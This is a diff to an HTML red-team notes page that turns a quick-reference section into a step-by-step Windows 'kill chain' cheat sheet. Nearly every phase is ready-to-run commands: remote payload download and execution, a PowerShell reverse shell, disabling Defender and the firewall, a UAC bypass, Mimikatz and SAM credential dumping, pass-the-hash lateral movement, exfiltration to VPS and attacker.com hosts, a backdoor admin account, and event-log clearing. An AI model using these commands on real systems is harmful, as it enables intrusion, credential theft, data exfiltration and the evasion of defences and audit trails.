@@ -357,101 +357,184 @@ body{background:var(--bg);color:var(--fg);font-family:'Inter',sans-serif;line-he
   </ul>
 </div>
 
-<!-- QUICK REF SECTION -->
+<!-- QUICK REF SECTION - KILL CHAIN ORDER -->
 <div class="section" id="quick-ref">
-  <div class="section-number">// QUICK REFERENCE</div>
-  <h2>CHEAT SHEETS & ONE-LINERS</h2>
+  <div class="section-number">// KILL CHAIN REFERENCE</div>
+  <h2>ATTACK SEQUENCE — STEP BY STEP</h2>
 
-  <div class="note">The mentor: "You should have your notes organized with commands, you shouldn't memorize." These are the commands you need, organized by category.</div>
+  <div class="note">"You should have your notes organized with commands, you shouldn't memorize." — mentor. Follow the kill chain: Recon → Access → Evasion → Execution → Privesc → Persist → Creds → Lateral → Exfil → Impact.</div>
 
-  <h3>RECON — KNOW THE TARGET</h3>
-  <pre class="code-block"># Who am I and what can I do?
-whoami
-whoami /groups
-whoami /priv
+  <h3>PHASE 1: RECON — KNOW THE TARGET</h3>
+  <pre class="code-block"># Identity & privileges
+whoami && whoami /groups && whoami /priv
 
-# What's this machine?
-systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
-hostname
+# System info (one-liner)
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
 
-# What's running?
-tasklist /svc
-netstat -ano
+# Network recon
+ipconfig /all && route print && netstat -ano
 
-# What's the network?
-ipconfig /all
-route print
+# Running processes & services
+tasklist /svc && sc query | findstr SERVICE_NAME
 
-# What services exist?
-sc query | findstr SERVICE_NAME
-sc qc <service_name>  # Check service config, look for weak permissions</pre>
-
-  <h3>PRIVESC — CLIMB THE LADDER</h3>
-  <pre class="code-block"># Automated enumeration (run these first)
-powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"
-
-# Check for weak services
-sc qc <service_name>
+# Check for weak service permissions
+sc qc &lt;service_name&gt;
 accesschk.exe -uwcqv "Authenticated Users" *
+
+# Defender status check
+powershell -c "Get-MpComputerStatus | Select RealTimeProtectionEnabled, IsTamperProtected"</pre>
+
+  <h3>PHASE 2: INITIAL ACCESS — GET CODE EXECUTION</h3>
+  <pre class="code-block"># Download & execute (IEX)
+powershell -w hidden -c "iex(iwr http://VPS/payload.ps1)"
+
+# HTA execution (phishing)
+mshta http://VPS:8080/payload.hta
+
+# Certutil download (stealthy - trusted MS binary)
+certutil -urlcache -split -f http://VPS/payload.exe %TEMP%\svc.exe && %TEMP%\svc.exe
+
+# One-liner reverse shell
+powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$s.Write(([Text.Encoding]::ASCII).GetBytes($o),0,$o.Length)}"</pre>
+
+  <h3>PHASE 3: EVASION — BYPASS DEFENSES</h3>
+  <pre class="code-block"># Add Defender exclusions (ADMIN - works with Tamper Protection ON)
+Add-MpPreference -ExclusionPath $env:TEMP; Add-MpPreference -ExclusionPath $env:APPDATA
+
+# Verify exclusions
+(Get-MpPreference).ExclusionPath
+
+# Disable script scanning (ADMIN)
+Set-MpPreference -DisableScriptScanning $true
+
+# Disable real-time monitoring (ADMIN - may trigger alert)
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# Disable firewall (ADMIN)
+netsh advfirewall set allprofiles state off</pre>
+
+  <h3>PHASE 4: EXECUTION — RUN YOUR PAYLOAD</h3>
+  <pre class="code-block"># Execute from excluded path (after adding exclusions)
+iwr http://VPS/deployer.exe -OutFile $env:TEMP\svc.exe; & $env:TEMP\svc.exe
+
+# UAC bypass + execute (fodhelper)
+New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force; Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(Default)" -Value "cmd /c $env:TEMP\payload.exe"; Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""; Start-Process fodhelper.exe
+
+# Request UAC elevation (social engineering)
+Start-Process powershell -Verb RunAs -ArgumentList "-ep bypass -c iex(iwr http://VPS/payload.ps1)"</pre>
+
+  <h3>PHASE 5: PRIVILEGE ESCALATION — CLIMB THE LADDER</h3>
+  <pre class="code-block"># Automated enumeration
+powershell -ep bypass -c "IEX(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1); Invoke-AllChecks"
+
+# ADMIN → SYSTEM via scheduled task (RECOMMENDED - works over remote)
+schtasks /create /tn SvcUpd /tr "$env:TEMP\svc.exe" /sc once /st 00:00 /ru SYSTEM /rl HIGHEST /f; schtasks /run /tn SvcUpd; schtasks /delete /tn SvcUpd /f
 
 # Exploit SeImpersonatePrivilege
 PrintSpoofer.exe -i -c cmd
-RoguePotato.exe -r 127.0.0.1 -e "cmd.exe" -l 9999</pre>
+RoguePotato.exe -r 127.0.0.1 -e "cmd.exe" -l 9999
 
-  <h3>PERSISTENCE — SAVE EVERY RUNG</h3>
-  <pre class="code-block"># User-level: Registry Run key
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsSecurity /t REG_SZ /d "C:\path\payload.exe" /f
+# Check for AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</pre>
 
-# Admin-level: Scheduled task
-schtasks /create /tn "WindowsSecurity" /tr "C:\path\payload.exe" /sc onlogon /ru SYSTEM
+  <h3>PHASE 6: PERSISTENCE — SAVE EVERY RUNG</h3>
+  <pre class="code-block"># USER level: Registry Run key
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WinSecurity /t REG_SZ /d "$env:APPDATA\svc.exe" /f
 
-# System-level: Service
-sc create WindowsSecurity binPath= "C:\path\payload.exe" start= auto
+# ADMIN level: Scheduled task (onlogon)
+schtasks /create /tn WinUpdate /tr "$env:APPDATA\svc.exe" /sc onlogon /ru SYSTEM /rl HIGHEST /f
 
-# The mentor's favorite: SSH server (legitimate, hard to detect)
-Add-WindowsCapability -Online -Name OpenSSH.Server
-Start-Service sshd
-Set-Service -Name sshd -StartupType Automatic</pre>
+# SYSTEM level: Service
+sc create WinDefendSvc binPath= "C:\ProgramData\svc.exe" start= auto
 
-  <h3>DEFENDER — BYPASS OR DISABLE</h3>
-  <pre class="code-block"># Silent: Add exclusion (works with Tamper Protection ON)
-Add-MpPreference -ExclusionPath "C:\path\to\your\folder"
+# SSH server (legitimate, hard to detect)
+Add-WindowsCapability -Online -Name OpenSSH.Server; Start-Service sshd; Set-Service -Name sshd -StartupType Automatic</pre>
 
-# Moderate: Disable real-time monitoring
-Set-MpPreference -DisableRealtimeMonitoring $true
+  <h3>PHASE 7: CREDENTIAL ACCESS — HARVEST CREDS</h3>
+  <pre class="code-block"># Mimikatz one-liner
+powershell -ep bypass -c "IEX(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1); Invoke-Mimikatz -DumpCreds"
 
-# Nuclear: Uninstall Defender (requires reboot, very noisy)
-# DON'T do this unless you have no other choice</pre>
+# SAM/SYSTEM dump (for offline cracking)
+reg save HKLM\SAM sam.hiv; reg save HKLM\SYSTEM system.hiv
 
-  <h3>C2 — REVERSE SHELL</h3>
-  <pre class="code-block"># Start listener (attacker machine)
-nc -lvnp 4444
+# Find passwords in files
+findstr /si "password=" *.txt *.ini *.config *.xml
 
-# Connect back (victim machine)
-powershell -c "$c=New-Object Net.Sockets.TCPClient('192.168.1.92',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$o2=$o+'PS '+(pwd).Path+'> ';$e=([Text.Encoding]::ASCII).GetBytes($o2);$s.Write($e,0,$e.Length)}"
+# WiFi passwords
+netsh wlan show profiles
+netsh wlan show profile name="SSID" key=clear</pre>
 
-# The mentor: "Reverse shell is the basic for everything."</pre>
+  <h3>PHASE 8: LATERAL MOVEMENT — SPREAD</h3>
+  <pre class="code-block"># PSExec (requires admin creds)
+psexec \\TARGET -u DOMAIN\user -p password cmd
+
+# WMI remote execution
+wmic /node:TARGET /user:DOMAIN\user /password:pass process call create "cmd /c payload.exe"
+
+# PowerShell remoting
+Enter-PSSession -ComputerName TARGET -Credential DOMAIN\user
+
+# Pass-the-Hash with Mimikatz
+sekurlsa::pth /user:Administrator /domain:TARGET /ntlm:HASH /run:cmd</pre>
+
+  <h3>PHASE 9: EXFILTRATION — GET DATA OUT</h3>
+  <pre class="code-block"># Upload via certutil (HTTP)
+certutil -urlcache -split -f http://VPS:8080/upload/%COMPUTERNAME%.txt C:\Windows\Temp\x
+
+# PowerShell upload
+Invoke-WebRequest -Uri http://VPS:8080/upload -Method POST -InFile C:\data\secrets.zip
+
+# DNS exfil (slow but stealthy)
+nslookup $(cat secret.txt | base64).attacker.com
+
+# SMB share (if accessible)
+copy C:\data\secrets.zip \\ATTACKER\share\</pre>
+
+  <h3>PHASE 10: IMPACT — DEMONSTRATE COMPROMISE</h3>
+  <pre class="code-block"># Create undeletable files (SYSTEM ownership, locked ACLs)
+1..10 | ForEach-Object { $f="C:\Users\victim\Desktop\PWNED$_.txt"; echo PWNED > $f; icacls $f /setowner SYSTEM; icacls $f /inheritance:r; icacls $f /grant SYSTEM:F }
+
+# Add backdoor admin account
+net user hacker P@ssw0rd123! /add; net localgroup Administrators hacker /add
+
+# Encrypt files (ransomware demo - AUTHORIZED ONLY)
+# Use with caution - only on test systems
+
+# Leave evidence of access (authorized pentest)
+echo "COMPROMISED BY [OPERATOR] - $(Get-Date)" > C:\Users\Public\PENTEST_PROOF.txt</pre>
+
+  <h3>CLEANUP — COVER TRACKS</h3>
+  <pre class="code-block"># Remove scheduled tasks
+schtasks /delete /tn TaskName /f
+
+# Remove services
+sc delete ServiceName
+
+# Remove registry persistence
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v KeyName /f
+
+# Remove files
+Remove-Item $env:TEMP\*.exe -Force; Remove-Item $env:TEMP\*.ps1 -Force
+
+# Remove Defender exclusions
+Remove-MpPreference -ExclusionPath $env:TEMP
+
+# Clear event logs (SYSTEM required - very noisy)
+wevtutil cl Security; wevtutil cl System; wevtutil cl Application</pre>
 
   <ul class="resource-list">
     <li>
       <a href="defensive-recon.html">Defensive Recon Cheat Sheet</a>
-      <div class="desc">Blue team field manual with live evidence. Network, process, persistence, AV, and file system hunting commands.</div>
+      <div class="desc">Blue team field manual. Detect the techniques above from the defender perspective.</div>
     </li>
     <li>
       <a href="https://github.com/rainfantry/lessons-from-teacher/blob/master/QUICK_CHEAT_SHEET.md" target="_blank">Windows Recon One-Liners</a>
-      <div class="desc">Situational awareness commands: whoami, systeminfo, netstat, tasklist, service enumeration.</div>
-    </li>
-    <li>
-      <a href="resources/mentor-defender-management.md">Defender Management</a>
-      <div class="desc">Exclusions, disabling, destructive removal, cleanup. The full spectrum from the mentor.</div>
-    </li>
-    <li>
-      <a href="https://github.com/rainfantry/lessons-from-teacher/blob/master/SYSTEM_SETTINGS.md" target="_blank">System Settings</a>
-      <div class="desc">PowerShell policies, Explorer settings, Defender checks. Configuration for operations.</div>
+      <div class="desc">Extended situational awareness commands for live engagement.</div>
     </li>
     <li>
       <a href="https://github.com/rainfantry/lessons-from-teacher/blob/master/PRIVESC_LADDER.md" target="_blank">Privilege Escalation Ladder</a>
-      <div class="desc">User → Admin → System. Persistence matrix. PowerUp, WinPEAS, LinPEAS.</div>
+      <div class="desc">Detailed User → Admin → System chain with persistence at each level.</div>
     </li>
   </ul>
 </div>
